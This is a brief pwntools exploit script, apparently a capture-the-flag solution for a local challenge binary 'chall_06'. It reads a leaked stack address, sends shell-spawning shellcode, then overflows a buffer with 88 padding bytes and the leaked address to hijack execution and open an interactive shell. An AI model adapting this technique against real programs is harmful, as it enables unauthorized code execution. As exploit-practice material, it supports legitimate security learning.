# coding: utf-8
from pwn import *
p = process("./chall_06")
p.recvuntil(b": ")
leak = p.recvline()
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload1 = shellcode
p.sendline(payload1)
payload2 = b"A"*88 + p64(int(leak, 16))
p.sendline(payload2)
p.interactive()
